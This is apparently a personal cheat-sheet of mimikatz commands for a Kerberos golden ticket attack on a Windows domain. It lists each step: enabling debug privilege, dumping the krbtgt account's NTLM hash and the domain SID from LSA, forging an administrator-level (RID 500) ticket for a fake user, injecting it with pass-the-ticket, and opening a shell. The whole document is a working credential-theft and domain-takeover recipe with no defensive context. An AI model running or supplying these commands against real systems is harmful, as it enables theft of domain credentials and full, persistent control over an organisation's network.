mimikatz:

#privilige::debug
#lsadump::lsa /inject /name:krbtgt
	- SID of domain
	- NTLM hash of krbtgt
#kerberos::golden /User:<fakeUser> /domain:<domain> /sid:<sid> /krbtgt:<hash> /id:500 /ptt
#misc::cmd